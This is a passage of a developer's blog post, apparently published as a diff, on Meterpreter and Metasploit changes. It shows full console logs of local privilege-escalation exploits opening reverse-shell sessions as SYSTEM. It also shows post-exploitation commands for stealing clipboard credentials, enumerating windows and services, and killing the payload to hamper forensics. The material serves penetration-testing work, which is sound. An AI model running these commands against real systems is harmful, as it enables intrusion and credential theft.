+[*] Backgrounding session 1...
+msf exploit(handler) &gt; use exploit/windows/local/ms10_015_kitrap0d
+msf exploit(ms10_015_kitrap0d) &gt; set session 1
+session =&gt; 1
+msf exploit(ms10_015_kitrap0d) &gt; exploit
+[*] Reloading module...
+
+[*] Started reverse handler on XX.XX.XX.3:4444
+[*] Launching notepad to host the exploit...
+[+] Process 1288 launched.
+[*] Reflectively injecting the exploit DLL into 1288...
+[*] Exploit injected. Injecting payload into 1288...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (768512 bytes) to XX.XX.XX.3
+[*] Meterpreter session 3 opened (XX.XX.XX.3:4444 -&gt; XX.XX.XX.3:51569) at 2013-11-13 23:53:36 -0600
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+
+<p>This was the first time I&rsquo;d ever worked with local exploits, and I won&rsquo;t deny that finishing it and seeing it all working made me feel like this:</p>
+
+<p><img src="/uploads/2013/12/f-yeah.gif" alt="Yeah!" /></p>
+
+<p>(Thanks to my good friend <a href="https://twitter.com/justinsteven">Justin</a> for showing me this image.)</p>
+
+<p>This exploit doesn&rsquo;t mess with your existing session at all, so that should continue to function as before. This exploit also supports the use of different payload types, just like every other exploit, making it a little more flexible than when it was part of <code>getsystem</code>. If you&rsquo;re interested in seeing how the module works, take a look at <a href="https://github.com/OJ/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_015_kitrap0d.rb">the source on Github</a>.</p>
+
+<p>After this change was merged, pentesters worldwide would rejoice in the fact that they could now resume normal <code>getsystem</code> programming instead of having to worry about sessions dying and machines crashing.</p>
+
+<p>A big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for helping get this over the line.</p>
+
+<h3 id="ppr-flatten-rec">ppr_flatten_rec</h3>
+
+<p>While doing the work to refactor the <a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf">Reflective DLL Injection</a> functionality into a <a href="http://git-scm.com/docs/git-submodule">git submodule</a>, allowing all exploits and Meterpreter itself to share the same codebase, I had to go through existing exploits and make sure they configured to use this new submodule. <code>ppr_flatten_rec</code> was one of the two that needed updating (the other was KiTrap0D).</p>
+
+<p>This exploit is quite nifty, though due to the nature of what it does, it can also make target systems unstable. For example, on my Windows 7 x86 machine, this exploit almost always worked, but would also make the desktop totally unusable. However, on my Windows Vista SP2 x86 box, I rarely had problems.</p>
+
+<p>The original version of this module elevated an existing session rather than doing what all good local exploits should do and create a new session post-elevation. So while I was refactoring for submodules I decided to fix this up as well. The <a href="https://github.com/rapid7/metasploit-framework/pull/2701">result</a> is a nicer local exploit that goes like this:</p>
+
+<pre><code class="language-plain">msf exploit(handler) &gt; exploit
+
+[*] Started reverse handler on XX.XX.XX.40:8000 
+[*] Starting the payload handler...
+[*] Sending stage (785920 bytes) to XX.XX.XX.43
+[*] Meterpreter session 1 opened (XX.XX.XX.40:8000 -&gt; XX.XX.XX.43:49234) at 2013-11-27 19:55:43 +1000
+
+meterpreter &gt; getuid
+Server username: WIN-P73NLAJOYFH\OJ
+meterpreter &gt; background
+[*] Backgrounding session 1...
+msf exploit(handler) &gt; use exploit/windows/local/ppr_flatten_rec
+msf exploit(ppr_flatten_rec) &gt; set session 1
+session =&gt; 1
+msf exploit(ppr_flatten_rec) &gt; exploit
+
+[*] Started reverse handler on XX.XX.XX.40:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 3128 launched.
+[*] Reflectively injecting the exploit DLL into 3128...
+[*] Exploit injected. Injecting payload into 3128...
+[*] Payload injected. Executing exploit...
+[*] Exploit thread executing (can take a while to run), waiting 10 sec ...
+[*] Sending stage (785920 bytes) to XX.XX.XX.43
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 2 opened (XX.XX.XX.40:4444 -&gt; XX.XX.XX.43:49235) at 2013-11-27 19:56:37 +1000
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+
+<p>Another big shout out goes to <a href="https://twitter.com/_sinn3r">sinn3r</a> and <a href="https://twitter.com/_juan_vazquez_">Juan</a> for aiding in making my code less shitty.</p>
+
+<h2 id="new-features">New Features</h2>
+
+<p>Making Meterpreter more stable, less crashy and more reliable is always the focus of the work, but at the same time it&rsquo;s important to improve it&rsquo;s feature set, along with that of Metasploit itself. We&rsquo;ve had some nice new features and upgrades in the toolset and I&rsquo;d like to share a few of them here.</p>
+
+<h3 id="ipv6-addresses-in-ipconfig">IPv6 Addresses in ipconfig</h3>
+
+<p>Work had already been done to make Windows render the IPv6 addresses on a victim machine, but there were a couple of things in the way of having them passed down to Metasploit when NICs were being parsed. [This pull request][ipv6_pr] adjusted things so that these addresses are included in the output.</p>
+
+<p>Here&rsquo;s what it looks like on one of my Vista VMs:</p>
+
+<pre><code>meterpreter &gt; ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 10
+============
+Name         : Intel(R) PRO/1000 MT Network Connection
+Hardware MAC : 00:0c:29:49:ae:13
+MTU          : 1480
+IPv4 Address : XX.XX.XX.52
+IPv4 Netmask : 255.255.248.0
+IPv6 Address : YYYY:YYYY:YYYY:0:5495:4239:4f53:7361
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+IPv6 Address : YYYY:YYYY:YYYY:0:5d5f:b4b3:22ed:8311
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+IPv6 Address : ZZZZ::ZZZZ:ZZZZ:ZZZZ:7361
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+</code></pre>
+
+<h3 id="incognito-v2">Incognito v2</h3>
+
+<p><a href="http://www.offensive-security.com/metasploit-unleashed/Fun_With_Incognito">Incognito</a> has been part of Meterpreter for a while in the form of the <code>ext_server_incognito</code> extension. This handy extension lets you do some magic with impersonation via tokens and is really useful during a penetration test. The original version of Incognito was implemented a long time, but since that first version was released a new version, <a href="https://labs.mwrinfosecurity.com/blog/2012/07/18/incognito-v2-0-released/">Incognito v2</a>, was released which fixed a bunch of bugs and added some other cool improvements. We decided to include this update in Meterpreter, and so I submitted <a href="https://github.com/rapid7/meterpreter/pull/42">this pull request</a> which included these changes (among other things) and the fantastic <a href="https://twitter.com/todb">todb</a> did me the honour of landing it in master.</p>
+
+<h3 id="getenv">getenv</h3>
+
+<p>It&rsquo;s not surprising to know that post-exploitation tasks can sometimes require access to variables that live inside the compromised machine&rsquo;s environment. However, there wasn&rsquo;t a sensible way to get access to this functionality, and as a result lots of module developers cheated and used the <code>expand_path</code> function that&rsquo;s part of the Standard API&rsquo;s <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/fs/file.rb">File System</a> module.</p>
+
+<p>I was talking to <a href="https://twitter.com/egyp7">Egypt</a> on IRC one morning and he mentioned that this was happening and that it really should be fixed so that environment variables are easily accessible without having to use the file system functions (which have a different semantic meaning).</p>
+
+<p>And, lo, the <code>getenv</code> changes were made to <a href="https://github.com/rapid7/meterpreter/blob/master/source/extensions/stdapi/server/sys/config/config.c#L43">Windows Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.py#L386">Python Meterpreter</a>, <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/meterpreter/ext_server_stdapi.php#L586">PHP Meterpreter</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb#L40">Metasploit framework</a>, and all about us knew that it was good. Here it is in action (showing how tolerant it is of <code>$</code> and <code>%</code> symbols):</p>
+
+<pre><code class="language-plain">meterpreter &gt; sysinfo
+Computer        : WIN-S45GUQ5KGVK
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/win64
+meterpreter &gt; getenv DOESNOTEXIST
+[-] None of the specified environment variables were found/set.
+meterpreter &gt; getenv temp $prompt $USERNAME %WINDIR% COMSPEC %windows_tracing_flags%
+
+Environment Variables
+=====================
+
+Variable               Value
+--------               -----
+prompt                 $P$G
+windows_tracing_flags  3
+temp                   C:\Users\OJ\AppData\Local\Temp
+WINDIR                 C:\Windows
+COMSPEC                C:\Windows\system32\cmd.exe
+USERNAME               OJ
+</code></pre>
+
+<pre><code class="language-plain">meterpreter &gt; sysinfo
+Computer     : ropchain
+OS           : Linux 3.11.8-200.fc19.x86_64 #1 SMP Wed Nov 13 16:29:59 UTC 2013
+Architecture : x86_64
+Meterpreter  : python/python
+meterpreter &gt; getenv PATH $PAGER %DISPLAY% TERM foo_doesnt_exist
+
+Environment Variables
+=====================
+
+Variable  Value
+--------  -----
+PATH      /home/oj/bin:/home/oj/.rvm/bin:/opt/mono/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/oj/.rvm/bin
+DISPLAY   :0.0
+PAGER     less
+TERM      xterm-256color
+</code></pre>
+
+<p>Big ups to <a href="https://twitter.com/egyp7">Egypt</a> for the idea, for implementing the PHP version, and for landing the PR into master.</p>
+
+<h3 id="getproxy">getproxy</h3>
+
+<p>This little gem was implemented after a chat with <a href="https://twitter.com/mubix">mubix</a> over a coffee one morning (he has a habit of feeding me ideas). He spoke about how it&rsquo;d be handy to be able to read the details of the system&rsquo;s proxy configuration in Windows, as this is used by Chrome and Internet Explorer behind the scenes. It didn&rsquo;t seem too hard, so I went ahead one evening and made it happen.</p>
+
+<pre><code class="language-plain">meterpreter &gt; getproxy
+Auto-detect     : No
+Auto config URL : 
+Proxy URL       : 
+Proxy Bypass    : 
+</code></pre>
+
+<pre><code class="language-plain">meterpreter &gt; getproxy
+Auto-detect     : Yes
+Auto config URL : http://baz:8080/foo.pac
+Proxy URL       : foo:80
+Proxy Bypass    : test;testagain;&lt;local&gt;
+</code></pre>
+
+<p>Another hat tip goes to <a href="https://twitter.com/todb">todb</a> for landing the <a href="https://github.com/rapid7/metasploit-framework/pull/2592">pull request</a>.</p>
+
+<h3 id="kill-s">Kill -s</h3>
+
+<p>Meterpreter sessions make it easy for the attacker to terminate processes via the <code>kill</code> command, however there&rsquo;s a level of protection in place in the console that is there to stop you from killing yourself. That is, if you somehow manage to pass in the <code>PID</code> of the Meterpreter session itself Metasploit will stop you. For the most part this makes sense, however there are times when you may actually want to terminate the current process.</p>
+
+<p>One example is when <code>msfpayload</code> is used to generate an executable that contains a <code>reverse_http</code> or <code>reverse_https</code> payload. As mentioned earlier, these payloads don&rsquo;t <em>currently</em> exit cleanly when using the <code>exit</code> command (we know! we&rsquo;re on it!), and so termination of the session does happen on the attacker&rsquo;s machine but on the victim&rsquo;s machine the process continues to run. This is obviously far from ideal.</p>
+
+<p>A short term fix was to add a <code>-s</code> option to the <code>kill</code> command which says &ldquo;please kill myself&rdquo;. Those people using either of those payloads with Meterpreter can use this to &ldquo;force kill&rdquo; the executable to prevent it from running after the session has ended. Yes, it&rsquo;s a small win, but it could prove useful and help people make forensics a little harder while we sort out the main part of the problem.</p>
+
+<p>Note: This doesn&rsquo;t make for a clean shutdown of Metasploit sessions, for obvious reasons!</p>
+
+<h3 id="extended-api-extension">Extended API extension</h3>
+
+<p>The Extended API, or <code>extapi</code>, is an extension that was born out of the need to have more helpful functionality for post-exploitation that didn&rsquo;t really belong in the Standard API (<code>stdapi</code>). Extra functionality is always nice, but you don&rsquo;t necessarily want to add extra weight to <code>stadpi</code> when it&rsquo;s already big enough.</p>
+
+<p>The meat of <code>extapi</code> comes from ideas that were shared with me by <a href="https://twitter.com/mubix">Mubix</a> and <a href="https://twitter.com/kernelsmith">Kernelsmith</a>, so credit where credit is due, these guys were the minds behind the extension. I just built it, which is the easy bit. The extension is new, and only has a little bit of functionality so far, but I have a goal to add a lot more very useful stuff in the future. The Metasploit pull request can be <a href="https://github.com/rapid7/metasploit-framework/pull/2602">found here</a> and the Meterpreter side is <a href="https://github.com/rapid7/meterpreter/pull/45">over here</a> if you&rsquo;d like to dive into the code.</p>
+
+<p><a href="https://twitter.com/todb">Tod</a> posted some details about this extension on a <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update">recent Metasploit blog post</a> (thanks Tod!), but I&rsquo;m going to dive into the guts a little more in this post.</p>
+
+<p><code>extapi</code> is Windows-only at this point, as the functionality that was added is Windows-specific. However, there&rsquo;s plenty of room for improvement and plenty of room for addition of features that POSIX will appreciate. If you feel compelled to get involved this is a great spot to get started.</p>
+
+<p>To load <code>extapi</code>, do the same as you would with any other extension:</p>
+
+<pre><code>meterpreter &gt; use extapi
+Loading extension extapi...success.
+</code></pre>
+
+<p>And with that, let&rsquo;s take a look at the features.</p>
+
+<h4 id="window-integration">Window Integration</h4>
+
+<pre><code class="language-plain">Extapi: Window Management Commands
+==================================
+
+    Command       Description
+    -------       -----------
+    window_enum   Enumerate all current open windows
+</code></pre>
+
+<p>On initial inspection this feature might seem rather uninteresting, but give it a chance. The goal here was to make it possible to enumerate all the windows on the current desktop to give you a clearer view of what the user is running, and to perhaps allow for interaction with those Windows later via Railgun. Being able to enumerate child windows of a given can also prove handy in some scenarios, and so this feature was also added.</p>
+
+<p>So why is it useful? Running <code>ps</code> on a target machine will only give you so much. You might be able to see that <code>notepad.exe</code> is running, but you didn&rsquo;t know that the user was currently editing <code>passwords.txt</code>. Window enumeration will tell you that. That little bit of extra context can really help a penetration tester focus their attack a little better, and let&rsquo;s face it, you can never have too much information when doing such tests.</p>
+
+<p>Detailed help for the <code>window_enum</code> command looks like this:</p>
+
+<pre><code>meterpreter &gt; window_enum -h
+
+Usage: window_enum [-h] [-p parent_window] [-u]
+
+Enumerate the windows on the target.
+
+Enumeration returns the Process ID and Window Handle for each window
+found. The Window Handle can be used for further calls to window_enum
+or the railgun API.
+
+OPTIONS:
+
+    -h        Help banner
+    -p &lt;opt&gt;  Parent window handle, used to enumerate child windows
+    -u        Include unknown/untitled windows in the result set
+
+Note: Not all windows can be enumerated. An attempt to enumerate
+      the children of such a window will result in a failure with the
+      message &quot;Operation failed: The parameter is incorrect.&quot;
+</code></pre>
+
+<p>The <code>-p</code> parameter is used when you&rsquo;re interested in looking at the child windows of a given window. This can be handy when narrowing down your search for meaningful information. If it&rsquo;s omitted, all the <em>named</em> top-level windows are enumerated. Some windows, when enumerated, do not yield a window title and by default these windows are not returned in the result set. To have them included, the <code>-u</code> parameter can be used. Each window that isn&rsquo;t named will have <code>&lt;unknown&gt;</code> specified as the window title.</p>
+
+<p>Here&rsquo;s a sample call, running on the context of the <code>SYSTEM</code> user on a Windows XP machine:</p>
+
+<pre><code>meterpreter &gt; window_enum
+
+Top-level windows
+=================
+
+PID  Handle  Title
+---  ------  -----
+956  65646   SYSTEM AGENT COM WINDOW
+
+Total top-level Windows: 1
+</code></pre>
+
+<p>As you can see, the <code>SYSTEM</code> user doesn&rsquo;t have many windows open, which makes sense. The context that Meterpreter is running under is the one under which the windows are enumerated. Therefore, to view the windows for a given user, the process must be running as that user. Here&rsquo;s a more interesting sample running as a user that actually has a desktop session running:</p>
+
+<pre><code>meterpreter &gt; window_enum
+
+Top-level windows
+=================
+
+PID   Handle  Title
+---   ------  -----
+156   196894  passwords - Notepad
+288   327766  C:\WINDOWS\System32\cmd.exe
+540   65574   NetDDE Agent
+608   131170  Start Menu
+608   65780   MS_WebcheckMonitor
+608   65782   Power Meter
+608   131328  Connections Tray
+608   65728   Program Manager
+1712  196868  vmtoolsdControlWndTitle
+1712  65804   DnDControlTitle
+1712  65810   UnitySetTopWindowGroupWindow
+1712  65812   GuestHostIntegrationWindow
+1712  65800   VMSwitchUserControlTitle
+1712  65802   VMDisplayChangeControlTitle
+1744  131292  DDE Server Window
+
+Total top-level Windows: 15
+</code></pre>
+
+<p>As you can see, it&rsquo;s possible to get more interesting information using this utility. That <code>notepad</code> instance looks like it could yield some juicy information.</p>
+
+<p>You can also have some silly fun, like so:</p>
+
+<pre><code class="language-plain">meterpreter &gt; irb
+[*] Starting IRB shell
+[*] The 'client' variable holds the meterpreter client
+
+&gt;&gt; client.extapi.window.enumerate.each {|w| client.railgun.user32.SetWindowTextA(w[:handle], &quot;PWNED!&quot;)}
+</code></pre>
+
+<p>And behold!</p>
+
+<p><img src="/uploads/2013/12/pwnd-desktop.png" alt="Owned Windows" /></p>
+
+<p>This is of course a silly example, but having control of the user&rsquo;s desktop windows can prove useful. Once you know the handle of target, it&rsquo;s possible to extract more meaningful information thanks to the Railgun API.</p>
+
+<p>You can also Rick Roll. And who doesn&rsquo;t love a good Rick Rolling?</p>
+
+<h4 id="service-integration">Service Integration</h4>
+
+<p>Now, on to more serious stuff.</p>
+
+<pre><code class="language-plain">Extapi: Service Management Commands
+===================================
+
+    Command        Description
+    -------        -----------
+    service_enum   Enumerate all registered Windows services
+    service_query  Query more detail about a specific Windows service
+</code></pre>
+
+<p>Services are a common point of attack. Misconfigured or old/vulnerable services can make for easy targets for local privilege escalation. The <code>service_enum</code> command lets us take a quick glance at what services are running, and what the status is. Here&rsquo;s the detailed help:</p>
+
+<pre><code class="language-plain">meterpreter &gt; service_enum -h
+
+Usage: service_enum [-h]
+
+Enumerate services installed on the target.
+
+Enumeration returns the Process ID, Status, and name of each installed
+service that was enumerated. The 'Int' value indicates if the service is
+able to interact with the desktop.
+</code></pre>
+
+<p>No parameters are required to make this function tick. Here&rsquo;s some sample output:</p>
+
+<pre><code class="language-plain">meterpreter &gt; service_enum
+
+Service List
+============
+
+PID   Status   Int  Name (Display Name)
+---   ------   ---  -------------------
+0     Stopped  N    alerter (Alerter)
+0     Stopped  N    alg (Application Layer Gateway Service)
+0     Stopped  N    appmgmt (Application Management)
+956   Running  N    audiosrv (Windows Audio)
+0     Stopped  N    bits (Background Intelligent Transfer Service)
+956   Running  N    browser (Computer Browser)
+0     Stopped  N    cisvc (Indexing Service)
+0     Stopped  N    clipsrv (ClipBook)
+0     Stopped  N    comsysapp (COM+ System Application)
+956   Running  N    cryptsvc (Cryptographic Services)
+956   Running  N    dhcp (DHCP Client)
+0     Stopped  N    dmadmin (Logical Disk Manager Administrative Service)
+0     Stopped  N    dmserver (Logical Disk Manager)
+1088  Running  N    dnscache (DNS Client)
+956   Running  N    ersvc (Error Reporting Service)
+640   Running  N    eventlog (Event Log)
+956   Running  N    eventsystem (COM+ Event System)
+0     Stopped  N    fastuserswitchingcompatibility (Fast User Switching Compatibility)
+956   Running  N    helpsvc (Help and Support)
+0     Stopped  N    hidserv (Human Interface Device Access)
+0     Stopped  N    imapiservice (IMAPI CD-Burning COM Service)
+956   Running  N    lanmanserver (Server)
+956   Running  N    lanmanworkstation (Workstation)
+1104  Running  N    lmhosts (TCP/IP NetBIOS Helper)
+0     Stopped  N    messenger (Messenger)
+0     Stopped  N    mnmsrvc (NetMeeting Remote Desktop Sharing)
+0     Stopped  N    msdtc (Distributed Transaction Coordinator)
+0     Stopped  N    msiserver (Windows Installer)
+0     Stopped  N    netdde (Network DDE)
+0     Stopped  N    netddedsdm (Network DDE DSDM)
+0     Stopped  N    netlogon (Net Logon)
+956   Running  N    netman (Network Connections)
+956   Running  N    nla (Network Location Awareness (NLA))
+0     Stopped  N    ntlmssp (NT LM Security Support Provider)
+0     Stopped  N    ntmssvc (Removable Storage)
+640   Running  N    plugplay (Plug and Play)
+652   Running  N    policyagent (IPSEC Services)
+652   Running  N    protectedstorage (Protected Storage)
+0     Stopped  N    rasauto (Remote Access Auto Connection Manager)
+0     Stopped  N    rasman (Remote Access Connection Manager)
+0     Stopped  N    rdsessmgr (Remote Desktop Help Session Manager)
+0     Stopped  N    remoteaccess (Routing and Remote Access)
+0     Stopped  N    rpclocator (Remote Procedure Call (RPC) Locator)
+856   Running  N    rpcss (Remote Procedure Call (RPC))
+0     Stopped  N    rsvp (QoS RSVP)
+652   Running  N    samss (Security Accounts Manager)
+0     Stopped  N    scarddrv (Smart Card Helper)
+0     Stopped  N    scardsvr (Smart Card)
+956   Running  N    schedule (Task Scheduler)
+956   Running  N    seclogon (Secondary Logon)
+956   Running  N    sens (System Event Notification)
+0     Stopped  N    sharedaccess (Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS))
+956   Running  N    shellhwdetection (Shell Hardware Detection)
+172   Running  N    spooler (Print Spooler)
+956   Running  N    srservice (System Restore Service)
+1104  Running  N    ssdpsrv (SSDP Discovery Service)
+0     Stopped  N    stisvc (Windows Image Acquisition (WIA))
+0     Stopped  N    swprv (MS Software Shadow Copy Provider)
+0     Stopped  N    sysmonlog (Performance Logs and Alerts)
+0     Stopped  N    tapisrv (Telephony)
+956   Running  N    termservice (Terminal Services)
+956   Running  N    themes (Themes)
+956   Running  N    trkwks (Distributed Link Tracking Client)
+956   Running  N    uploadmgr (Upload Manager)
+0     Stopped  N    upnphost (Universal Plug and Play Device Host)
+0     Stopped  N    ups (Uninterruptible Power Supply)
+1496  Running  N    vmtools (VMware Tools)
+808   Running  N    vmware physical disk helper service (VMware Physical Disk Helper Service)
+0     Stopped  N    vss (Volume Shadow Copy)
+956   Running  N    w32time (Windows Time)
+1104  Running  N    webclient (WebClient)
+956   Running  N    winmgmt (Windows Management Instrumentation)
+956   Running  N    wmdmpmsp (Portable Media Serial Number)
+0     Stopped  N    wmiapsrv (WMI Performance Adapter)
+0     Stopped  N    wuauserv (Automatic Updates)
+956   Running  N    wzcsvc (Wireless Zero Configuration)
+</code></pre>
+
+<p>PIDs are shown so that the attacker can migrate to a chosen service easily using the <code>migrate &lt;pid&gt;</code> command. If the attacker is interested in more detail, then the <code>service_query</code> function can be used to dig deeper:</p>
+
+<pre><code class="language-plain">meterpreter &gt; service_query -h
+
+Usage: service_query [-h] &lt;servicename&gt;
+     &lt;servicename&gt;:  The name of the service to query.
+
+Gets details information about a particular Windows service, including
+binary path, DACL, load order group, start type and more.
+</code></pre>
+
+<p>The name of the service is required to drill deeper, and this is what it looks like when it&rsquo;s run:</p>
+
+<pre><code class="language-plain">meterpreter &gt; service_query winmgmt
+
+Name        : winmgmt
+Display     : Windows Management Instrumentation
+Account     : LocalSystem
+Start Type  : Automatic
+Path        : C:\WINDOWS\system32\svchost.exe -k netsvcs
+L.O. Group  :
+Interactive : No
+DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)
+</code></pre>
+
+<p>You&rsquo;ll notice that the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa446597(v=vs.85).aspx">DACL</a> hasn&rsquo;t been parsed into something easily digestable. This is a work in progress, as I&rsquo;m able to parse the DACL but can&rsquo;t yet come up with a nice way of rendering it. I&rsquo;m open to suggestions and pull requests!</p>
+
+<h4 id="clipboard-integration">Clipboard Integration</h4>
+
+<p>This is my favourite and the main motivation for starting the <code>extapi</code> extension in the first place.</p>
+
+<pre><code class="language-plain">Extapi: Clipboard Management Commands
+=====================================
+
+    Command             Description
+    -------             -----------
+    clipboard_get_data  Read the victim's current clipboard
+    clipboard_set_text  Write text to the victim's clipboard
+</code></pre>
+
+<p>Now we can at least partially own the clipboard, and it&rsquo;s contents. This opens up the possibility for snarfing credentials and other important information from the user while they&rsquo;re using the clipboard. One good example of this is when people are using password managers, such as KeypassX, to copy and paste credentials into browsers or applications.</p>
+
+<p>The only problem is that I the functions need to be invoked manually, and at the right time. This can obviously be difficult and requires a bit of luck. The commands, which I will go into in just a minute, were designed to be the building blocks for me to build what I will call the <code>clipboard_monitor</code>!</p>
+
+<p>But first, let&rsquo;s look at the bit of magic that let&rsquo;s us pull clipboard data from the victim.</p>
+
+<pre><code class="language-plain">meterpreter &gt; clipboard_get_data -h
+
+Usage: clipboard_get_data [-h] [-d]
+
+Attempts to read the data from the victim's clipboard. If the data is in a
+supported format, it is read and returned to the user.
+
+OPTIONS:
+
+    -d &lt;opt&gt;  Download non-text content to the specified folder (or current folder)
+    -h        Help banner
+</code></pre>
+
+<p>One thing to beard in mind about the clipboard is that it&rsquo;s not possible to tell what&rsquo;s on there without querying it. This is why I didn&rsquo;t create a <code>clipboard_get_text</code> function, for example, because the data might not be text. Instead, this general function will pull down whatever it finds on the clipboard so long as it&rsquo;s supported. Currently the extension supports the three main types: <strong>text</strong>, <strong>files</strong>, and <strong>images</strong>.</p>
+
+<p>Text data is the most obvious and simple to handle. If we pretend that the user from the previous screenshot has copied the content of <code>notepad</code> to the clipboard, this is what we get:</p>
+
+<pre><code>meterpreter &gt; clipboard_get_data
+
+Current Clipboard Text
+======================
+
+This is secret!
+</code></pre>
+
+<p>Pretty simple stuff. It does get more complicated when we want to deal with something like one or more files:</p>
+
+<pre><code>meterpreter &gt; clipboard_get_data
+
+Current Clipboard Files
+=======================
+
+File Path               Size (bytes)
+---------               ------------
+C:\Python27\NEWS.txt    263050
+C:\Python27\README.txt  54961
+C:\Python27\python.exe  26624
+
+3 file(s) totalling 344635 bytes
+</code></pre>
+
+<p>Here we can see that the user has got a selection of files on the clipboard, and the extension lets us know what they are and how big they are. Directories are also supported, but displayed as a file with 0 bytes, like so:</p>
+
+<pre><code>meterpreter &gt; clipboard_get_data
+
+Current Clipboard Files
+=======================
+
+File Path               Size (bytes)
+---------               ------------
+C:\Python27\Doc         0
+C:\Python27\NEWS.txt    263050
+C:\Python27\README.txt  54961
+C:\Python27\python.exe  26624
+
+4 file(s) totalling 344635 bytes
+</code></pre>
+
+<p>This might change in future, but for now this is how it works. Doing a recursive file stat to get counts of files and files sizes was deemed overkill for the sake of this exercise.</p>
+
+<p>While this output is interesting, it&rsquo;d be more useful to be able to download those files as well. This is where the <code>-d</code> switch comes in, as this tells the extension to download the files to the local machine:</p>
+
+<pre><code class="language-plain">meterpreter &gt; clipboard_get_data -d
+
+[*] Downloading Clipboard Files ...
+downloading: C:\Python27\README.txt -&gt; /Users/oj/code/metasploit-framework/README.txt
+downloaded : C:\Python27\README.txt -&gt; /Users/oj/code/metasploit-framework/README.txt
+downloading: C:\Python27\Doc\python271.chm -&gt; /Users/oj/code/metasploit-framework/Doc/python271.chm
+downloaded : C:\Python27\Doc\python271.chm -&gt; /Users/oj/code/metasploit-framework/Doc/python271.chm
+downloading: C:\Python27\NEWS.txt -&gt; /Users/oj/code/metasploit-framework/NEWS.txt
+downloaded : C:\Python27\NEWS.txt -&gt; /Users/oj/code/metasploit-framework/NEWS.txt
+downloading: C:\Python27\python.exe -&gt; /Users/oj/code/metasploit-framework/python.exe
+downloaded : C:\Python27\python.exe -&gt; /Users/oj/code/metasploit-framework/python.exe
+[+] Downloaded 4 file(s).
+</code></pre>
+
+<p>Here you can see that download does work recursively. So we can deal with text and files, what about image data? What if someone takes a screenshot of something?</p>
+
+<pre><code class="language-plain">meterpreter &gt; clipboard_get_data
+
+Clipboard Image Dimensions: 240x180
+Re-run with -d to download image.
+</code></pre>
+
+<p>The extension tells us that there is image data on the clipboard, and that again we can use the <code>-d</code> switch to pull the data down:</p>
+
+<pre><code class="language-plain">Clipboard Image Dimensions: 240x180
+[+] Clipboard image saved to /Users/oj/code/metasploit-framework/ZoepvBYT.jpg
+</code></pre>
+
+<p>Images are captured by Meterpreter, compressed to JPG using <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms533798(v=vs.85).aspx">GDI+</a>, and shipped down to the attacker&rsquo;s machine in the usual manner. This does mean that machines that are Windows 2000 SP3 or earlier can&rsquo;t work with the image downloader, because they don&rsquo;t have GDI+ installed. This probably isn&rsquo;t going to be a big problem given the number of machines out there that fit this description. Down the track, I plan to update the built-in screenshot utility to use GDI+ as well.</p>
+
+<p>Now if only we could do all this automatically when the clipboard content changes. Fear not, dear reader! This is a work in progress.</p>
+
+<pre><code class="language-plain">meterpreter &gt; clipboard_monitor
+ 
+Usage: clipboard_monitor &lt;start|pause|resume|stop&gt; [-f] [-i] [-h]
+ 
+Starts or stops a background clipboard monitoring thread. The thread watches
+the clipboard on the target, under the context of the current desktop, and when
+changes are detected the contents of the clipboard are returned to the attacker.
+ 
+  - start  - starts the clipboard monitor with the given arguments if
+             the thread is not already running.
+  - pause  - pauses a currently running clipboard monitor thread.
+  - resume - resumes a currently paused clipboard monitor thread.
+  - stop   - stops a currently running or paused clipboard monitor thread.
+ 
+OPTIONS:
+ 
+    -f        Automatically download files
+    -h        Help banner
+    -i        Automatically download image content
+    -l &lt;opt&gt;  Specifies the folder to write the clipboard loot to
+ 
+ 
+meterpreter &gt; clipboard_monitor start -l /tmp
+[*] Clipboard monitor looting to /tmp ...
+[*] Download files? No
+[*] Download images? No
+[+] Clipboard monitor started
+</code></pre>
+
+<p>As you can see, some work has been done already. Capturing the clipboard changes has already been implemented, but rather than buffer them on the victim&rsquo;s machine the goal is to create a streaming mechanism that will push the data to the attacker as soon as possible. This prevents issues with memory usage on the client, it means that information is made available as it happens, and it also removes the possibility of data being lost if the user manages to terminate Meterpreter.</p>
+
+<p>This work will also go towards supporting streaming for other helpful Meterpreter features such as keylogging and packet capture.</p>
+
+<p>The final command, <code>clipboard_set_text</code>, is a bit of a cute novelty that fits into the same category as some other Metasploit features in that it&rsquo;s used to scare the victim a little. Setting text is the only thing that is supported, image content and files <em>might</em> come later but are currently a very low priority.</p>
+
+<pre><code class="language-plain">meterpreter &gt; clipboard_set_text You have been owned!
+meterpreter &gt; clipboard_get_data
+
